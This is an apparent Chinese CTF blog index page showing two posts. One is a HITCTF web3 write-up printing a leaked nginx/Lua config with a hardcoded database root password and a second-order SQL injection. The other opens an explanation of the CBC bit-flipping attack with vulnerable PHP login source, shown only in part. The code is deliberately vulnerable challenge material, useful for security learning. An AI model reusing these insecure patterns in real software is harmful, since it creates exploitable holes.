<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>UPONのblog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="UPONのblog"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="UPONのblog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="UPON-2021の屋子"><meta property="og:url" content="https://upon-2021.github.io/"><meta property="og:site_name" content="UPON-2021の屋子"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://upon-2021.github.io/img/avatar.png"><meta property="article:author" content="UPON-2021"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"xn--upon-eu0gs25bb4r113aow1c.googles.icu"},"headline":"UPONのblog","image":["/img/og_image.png"],"author":{"@type":"Person","name":"UPON2021"},"description":""}</script><link rel="icon" href="/img/favicon.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.0.2"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="UPONのblog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/friend">友链</a><a class="navbar-item" href="/message">留言</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://gitter.im/hexo-theme-amazing/community"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card widget">
            <div class="card-content">
                <h3 class="menu-label">热门推荐</h3><span id="index_hot_div">加载中，请稍等...</span>
            </div>
        </div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-11-26  <a class="commentCountImg" href="/2022/11/26/hitctf/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>4 分钟  <i class="fas fa-pencil-alt"> </i>0.6 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/11/26/hitctf/"> </a></h1><div class="content"><h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>robots.txt发现敏感文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">//nginx.conf</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">    #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">    #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            default_type text/html;</span><br><span class="line"></span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line"></span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                local mysql = require &quot;resty.mysql&quot;</span><br><span class="line">                local db, err = mysql:new()</span><br><span class="line">                if not db then</span><br><span class="line">                    -- ngx.say(&quot;failed to instantiate mysql: &quot;, err)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line">                </span><br><span class="line">                local ok, err, errcode, sqlstate = db:connect&#123;</span><br><span class="line">                            path = &quot;/run/mysqld/mysqld.sock&quot;,</span><br><span class="line">                            database = &quot;app&quot;,</span><br><span class="line">                            user = &quot;root&quot;,</span><br><span class="line">                            password = &quot;hello&quot; &#125;</span><br><span class="line"></span><br><span class="line">                if not ok then</span><br><span class="line">                    -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                local headers = ngx.req.get_headers()</span><br><span class="line">                local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;)</span><br><span class="line"></span><br><span class="line">                if headers[&quot;X-Forwarded-For&quot;] then</span><br><span class="line">                     ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;])</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                uri = ngx.quote_sql_str(ngx.var.request_uri)</span><br><span class="line"></span><br><span class="line">                local sql = &quot;INSERT INTO records(url, ip) VALUES (&quot; .. uri .. &quot;, &quot; .. ip .. &quot;)&quot;</span><br><span class="line">                -- ngx.say(sql)</span><br><span class="line"></span><br><span class="line">                res, err, errcode, sqlstate =</span><br><span class="line">                    db:query(sql)</span><br><span class="line">                if not res then</span><br><span class="line">                    -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                -- local cjson = require &quot;cjson&quot;</span><br><span class="line">                -- ngx.say(&quot;result: &quot;, ip, cjson.encode(uri))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /cat-admin-panel/history &#123;</span><br><span class="line">            default_type text/html;</span><br><span class="line"></span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                local mysql = require &quot;resty.mysql&quot;</span><br><span class="line">                local db, err = mysql:new()</span><br><span class="line">                if not db then</span><br><span class="line">                    -- ngx.say(&quot;failed to instantiate mysql: &quot;, err)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line">                </span><br><span class="line">                local ok, err, errcode, sqlstate = db:connect&#123;</span><br><span class="line">                            path = &quot;/run/mysqld/mysqld.sock&quot;,</span><br><span class="line">                            database = &quot;app&quot;,</span><br><span class="line">                            user = &quot;root&quot;,</span><br><span class="line">                            password = &quot;hello&quot; &#125;</span><br><span class="line"></span><br><span class="line">                if not ok then</span><br><span class="line">                    -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line">                </span><br><span class="line">                local headers = ngx.req.get_headers()</span><br><span class="line">                local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;)</span><br><span class="line"></span><br><span class="line">                if headers[&quot;X-Forwarded-For&quot;] then</span><br><span class="line">                     ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;])</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                local cjson = require &quot;cjson&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                local user_mode = ngx.var.arg_user_mode</span><br><span class="line">                local sql</span><br><span class="line"></span><br><span class="line">                if user_mode == &quot;yes&quot; then</span><br><span class="line">                    res, err, errcode, sqlstate = db:query(&quot;SELECT * FROM users WHERE ip = &quot; .. ip)</span><br><span class="line">                    </span><br><span class="line">                    if not res[1] then</span><br><span class="line">                       return</span><br><span class="line">                    end</span><br><span class="line"></span><br><span class="line">                    local name = res[1][&quot;name&quot;]</span><br><span class="line">                    ngx.say(&quot;Your history:&lt;br&gt;&quot;)</span><br><span class="line">                    sql = &quot;SELECT records.url, users.name, users.ip FROM records, users WHERE users.name = &#x27;&quot;..name..&quot;&#x27; AND records.ip = users.ip&quot;</span><br><span class="line">                else</span><br><span class="line">                    ngx.say(&quot;Site request history: &lt;br&gt;&quot;)</span><br><span class="line">                    sql = &quot;SELECT * FROM records&quot;</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                res, err, errcode, sqlstate = db:query(sql)</span><br><span class="line">                if not res then</span><br><span class="line">                    -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                ngx.say(cjson.encode(res))</span><br><span class="line"></span><br><span class="line">                -- ngx.say(ngx.var.remote_addr)</span><br><span class="line"></span><br><span class="line">                db:close()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /cat-admin-panel/register &#123;</span><br><span class="line">            default_type text/html;</span><br><span class="line"></span><br><span class="line">            content_by_lua_block &#123;</span><br><span class="line">                local mysql = require &quot;resty.mysql&quot;</span><br><span class="line">                local db, err = mysql:new()</span><br><span class="line">                if not db then</span><br><span class="line">                    -- ngx.say(&quot;failed to instantiate mysql: &quot;, err)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line">                </span><br><span class="line">                local ok, err, errcode, sqlstate = db:connect&#123;</span><br><span class="line">                            path = &quot;/run/mysqld/mysqld.sock&quot;,</span><br><span class="line">                            database = &quot;app&quot;,</span><br><span class="line">                            user = &quot;root&quot;,</span><br><span class="line">                            password = &quot;hello&quot; &#125;</span><br><span class="line"></span><br><span class="line">                if not ok then</span><br><span class="line">                    -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line">                </span><br><span class="line">                local headers = ngx.req.get_headers()</span><br><span class="line">                local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;)</span><br><span class="line"></span><br><span class="line">                if headers[&quot;X-Forwarded-For&quot;] then</span><br><span class="line">                     ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;])</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                local cjson = require &quot;cjson&quot;</span><br><span class="line"></span><br><span class="line">                local user = ngx.var.arg_user</span><br><span class="line"></span><br><span class="line">                ngx.say(&quot;Your IP: &quot;, ip)</span><br><span class="line">                ngx.say(&quot;Your name: &quot;, user)</span><br><span class="line"></span><br><span class="line">                if user then</span><br><span class="line">                    res, err, errcode, sqlstate = db:query(&quot;INSERT INTO users(name, ip) VALUES (&quot;.. ngx.quote_sql_str(user) ..&quot;,&quot;.. ip ..&quot;)&quot;)</span><br><span class="line"></span><br><span class="line">                    if not res then</span><br><span class="line">                        -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;)</span><br><span class="line">                        return</span><br><span class="line">                    end</span><br><span class="line">                else</span><br><span class="line">                    ngx.say(&quot;Who?&quot;)</span><br><span class="line">                    return</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                db:close()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-11-21  <a class="commentCountImg" href="/2022/11/21/cbc/#comment-container"><span class="display-none-class">36a4062bfc37ad56c03d1169dd15ab1a</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="36a4062bfc37ad56c03d1169dd15ab1a">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>10 分钟  <i class="fas fa-pencil-alt"> </i>1.5 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/11/21/cbc/">CBC反转攻击详解</a></h1><div class="content"><h1 id="0x00-源码"><a href="#0x00-源码" class="headerlink" title="0x00 源码"></a>0x00 源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;static/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(document).<span class="title function_ invoke__">ready</span>(function() &#123;</span><br><span class="line">	$(<span class="string">&quot;.username&quot;</span>).<span class="title function_ invoke__">focus</span>(function() &#123;</span><br><span class="line">		$(<span class="string">&quot;.user-icon&quot;</span>).<span class="title function_ invoke__">css</span>(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;-48px&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(<span class="string">&quot;.username&quot;</span>).<span class="title function_ invoke__">blur</span>(function() &#123;</span><br><span class="line">		$(<span class="string">&quot;.user-icon&quot;</span>).<span class="title function_ invoke__">css</span>(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;0px&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	$(<span class="string">&quot;.password&quot;</span>).<span class="title function_ invoke__">focus</span>(function() &#123;</span><br><span class="line">		$(<span class="string">&quot;.pass-icon&quot;</span>).<span class="title function_ invoke__">css</span>(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;-48px&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(<span class="string">&quot;.password&quot;</span>).<span class="title function_ invoke__">blur</span>(function() &#123;</span><br><span class="line">		$(<span class="string">&quot;.pass-icon&quot;</span>).<span class="title function_ invoke__">css</span>(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;0px&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="string">&#x27;9999999999999999&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">get_random_iv</span>();</span><br><span class="line">    <span class="variable">$plain</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;iv&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;cipher&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$plain</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$plain</span>).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Flag is ctf&#123;123cbcchange&#125;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    